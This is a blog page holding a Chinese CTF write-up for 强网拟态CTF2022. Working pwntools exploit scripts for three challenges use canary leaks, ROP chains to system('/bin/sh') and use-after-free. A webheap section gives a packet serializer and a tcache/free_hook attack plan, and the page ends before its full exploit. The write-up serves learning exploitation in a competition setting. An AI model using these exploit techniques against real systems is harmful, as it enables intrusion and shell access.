<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Pwn进你的心">
<meta property="og:url" content="http://example.com/page/11/index.html">
<meta property="og:site_name" content="Pwn进你的心">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="yhellow">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/11/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>Pwn进你的心</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Pwn进你的心</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/13/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81CTF2022/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/11/13/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81CTF2022/" class="post-title-link" itemprop="url">强网拟态CTF2022</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-11-13 17:50:51" itemprop="dateCreated datePublished" datetime="2022-11-13T17:50:51+08:00">2022-11-13</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-12-19 18:00:57" itemprop="dateModified" datetime="2022-12-19T18:00:57+08:00">2022-12-19</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Competition/" itemprop="url" rel="index"><span itemprop="name">Competition</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>25k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>23 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="pwn1-pwn1-1-pwn2-1"><a href="#pwn1-pwn1-1-pwn2-1" class="headerlink" title="pwn1 ~ pwn1-1 ~ pwn2-1"></a>pwn1 ~ pwn1-1 ~ pwn2-1</h2><p>这3个题比较简单，就直接放 exp 了：</p>
<p><strong>pwn1</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./pwn1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.27.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;172.51.221.145&#x27;</span>, <span class="string">&#x27;9999&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b* \n&quot;)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0xB19)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;You will find some tricks\n&quot;</span>)</span><br><span class="line">leak_addr = <span class="built_in">eval</span>(p.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">proc_base = leak_addr - <span class="number">0xA94</span></span><br><span class="line">system = <span class="number">0xA2C</span> + proc_base</span><br><span class="line">binsh = <span class="number">0x202068</span> + proc_base</span><br><span class="line">pop_rdi = <span class="number">0x0000000000000c73</span> + proc_base</span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;proc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(proc_base))</span><br><span class="line">success(<span class="string">&quot;system &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">payload = <span class="string">&quot;%33$p&quot;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;hello\n&quot;</span>)</span><br><span class="line">canary = <span class="built_in">eval</span>(p.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">success(<span class="string">&quot;canary &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">200</span> + p64(canary) + p64(<span class="number">0</span>) + p64(pop_rdi) + p64(binsh) + p64(system)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><strong>pwn1-1</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./pwn1-1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.27.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;172.51.221.131&#x27;</span>,<span class="string">&#x27;9999&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b* \n&quot;)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x153C)\nb *$rebase(0x1423)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;You will find some tricks\n&quot;</span>)</span><br><span class="line">leak_addr = <span class="built_in">eval</span>(p.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">proc_base = leak_addr - <span class="number">0x12a0</span></span><br><span class="line">system = <span class="number">0x11A2</span> + proc_base</span><br><span class="line">binsh = <span class="number">0x4050</span>+ proc_base</span><br><span class="line">pop_rdi = <span class="number">0x0000000000001943</span> + proc_base</span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;proc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(proc_base))</span><br><span class="line">success(<span class="string">&quot;system &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;b&#x27;</span>*(<span class="number">0xd0</span>) + p64(proc_base + <span class="number">0x4060</span> )</span><br><span class="line">payload = payload.ljust(<span class="number">0xd0</span>-<span class="number">1</span>,<span class="string">&quot;a&quot;</span>)+p64(proc_base + <span class="number">0x4060</span>)*<span class="number">4</span>+ p64(pop_rdi) + p64(binsh) + p64(system)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><strong>pwn2-1</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./pwn2-1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.27.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;172.51.221.20&#x27;</span>,<span class="string">&#x27;9999&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x1B0A)\n&quot;</span>)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">ch</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(ch))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Note size :&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content :&quot;</span>,<span class="built_in">str</span>(content))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index</span>):</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Your choice :let us give you some tips\n&quot;</span>)</span><br><span class="line">leak_addr = <span class="built_in">eval</span>(p.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">pro_base = leak_addr - <span class="number">0x11f0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;pro_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(pro_base))</span><br><span class="line"></span><br><span class="line">catflag = <span class="number">0x1B70</span>+pro_base</span><br><span class="line">chunk_list = <span class="number">0x40A0</span>+pro_base</span><br><span class="line">success(<span class="string">&quot;chunk_list &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(chunk_list))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x18</span>,p64(catflag))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="webheap"><a href="#webheap" class="headerlink" title="webheap"></a>webheap</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.27</span><span class="number">-3u</span>buntu1<span class="number">.4</span>)</span> stable release version 2.27.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">webheap: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=<span class="number">27</span>dde4c970e713a66d152d11040e93cccb362625, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p><strong>cpp 反序列化 -&gt; python 序列化</strong></p>
<p>程序实现了反序列化读入</p>
<ul>
<li>内存里存的数据不通用，不同系统不同语言的组织可能都是不一样的</li>
<li>序列化的二进制数据是通过一定的协议将数据字段进行拼接<ul>
<li>第一个优势是：不同的语言都可以遵循这种协议进行解析，实现了跨语言</li>
<li>第二个优势是：这种数据可以直接持久化到磁盘，从磁盘读取后也可以通过这个协议解析出来</li>
</ul>
</li>
</ul>
<p>如果要想使用网络框架的 API 来传输结构化的数据，必须得先实现 [结构化的数据] 与 [字节流] 之间的双向转换，这种将结构化数据转换成字节流的过程，称为序列化，反过来转换，就是反序列化</p>
<p>本题目用 cpp 来实现反序列化，难点就在逆向的过程，要在一堆很难看的 cpp 代码中找到“编码格式”（目标地址为“0x45A8”）</p>
<ul>
<li>我对于 cpp 的逆向不是很熟悉，但在比赛的过程中也收获了一些 cpp 的逆向技巧（之后总结一下）</li>
<li>以后有机会写一个反序列化的 cpp 程序，然后拖 IDA 分析一下</li>
</ul>
<p>这种题目的关键就在于：根据反序列化的代码，来推导实现序列化的 python 脚本</p>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">dele</span><span class="params">(<span class="keyword">unsigned</span> __int64 index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( index &gt; <span class="number">0xF</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span> *)chunk_list[index]);              <span class="comment">// UAF</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>有 UAF</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>当逆向工作完成之后，可以根据程序的反序列化过程，写出序列化的脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setuint</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x&gt;=<span class="number">0</span> <span class="keyword">and</span> x&lt;=<span class="number">0x7f</span>:</span><br><span class="line">        <span class="keyword">return</span> p8(<span class="number">0x80</span>)+p8(x)</span><br><span class="line">    <span class="keyword">elif</span> x&gt;=<span class="number">0x80</span> <span class="keyword">and</span> x&lt;=<span class="number">0x7fff</span>:</span><br><span class="line">        <span class="keyword">return</span> p8(<span class="number">0x81</span>)+p16(x)</span><br><span class="line">    <span class="keyword">elif</span> x&gt;=<span class="number">0x8000</span> <span class="keyword">and</span> x&lt;=<span class="number">0x7fffffff</span>:</span><br><span class="line">        <span class="keyword">return</span> p8(<span class="number">0x82</span>)+p32(x)</span><br><span class="line">    <span class="keyword">elif</span> x&gt;=<span class="number">0x80000000</span> <span class="keyword">and</span> x&lt;=<span class="number">0x7fffffffffffffff</span>:</span><br><span class="line">        <span class="keyword">return</span> p8(<span class="number">0x83</span>)+p64(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setint</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x &gt;= <span class="number">0</span> <span class="keyword">and</span> x &lt;= <span class="number">0xff</span>:</span><br><span class="line">        <span class="keyword">return</span> p8(<span class="number">0x84</span>)+p8(x)</span><br><span class="line">    <span class="keyword">elif</span> x&gt;=<span class="number">0x100</span> <span class="keyword">and</span> x&lt;=<span class="number">0xffff</span>:</span><br><span class="line">        <span class="keyword">return</span> p8(<span class="number">0x85</span>)+p16(x)</span><br><span class="line">    <span class="keyword">elif</span> x&gt;=<span class="number">0x10000</span> <span class="keyword">and</span> x&lt;=<span class="number">0xffffffff</span>:</span><br><span class="line">        <span class="keyword">return</span> p8(<span class="number">0x86</span>)+p32(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_code</span>(<span class="params">op, idx, size, num1,num2</span>):</span></span><br><span class="line">    payload = p8(<span class="number">0xb9</span>) + p8(<span class="number">0x05</span>)</span><br><span class="line">    payload += setint(op) + setuint(idx) +setuint(size) + <span class="string">&#x27;\xBD&#x27;</span>+setuint(num1)+p8(<span class="number">0</span>)+setuint(num2)</span><br><span class="line">    sla(<span class="string">&#x27;Packet length: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">    sa(<span class="string">&#x27;Content:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size</span>):</span></span><br><span class="line">    <span class="keyword">return</span> send_code(<span class="number">0</span>,idx,size,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    <span class="keyword">return</span> send_code(<span class="number">1</span>,idx,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    <span class="keyword">return</span> send_code(<span class="number">2</span>,idx,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,cont</span>):</span></span><br><span class="line">    payload = p8(<span class="number">0xb9</span>) + p8(<span class="number">0x05</span>)</span><br><span class="line">    payload += p8(<span class="number">3</span>) +p8(idx) + p8(<span class="number">0x30</span>) + <span class="string">&#x27;\xBD&#x27;</span>+p8(<span class="number">6</span>)+p64(cont)</span><br><span class="line">    sla(<span class="string">&#x27;Packet length: &#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">    sa(<span class="string">&#x27;Content:&#x27;</span>, payload)</span><br></pre></td></tr></table></figure>
<p>利用 UAF 完成泄露以后，就打 tcache attack，尝试申请 <code>free_hook</code>，然后修改为 <code>system</code> 就可以了</p>
<p>完整 exp 如下：</p>
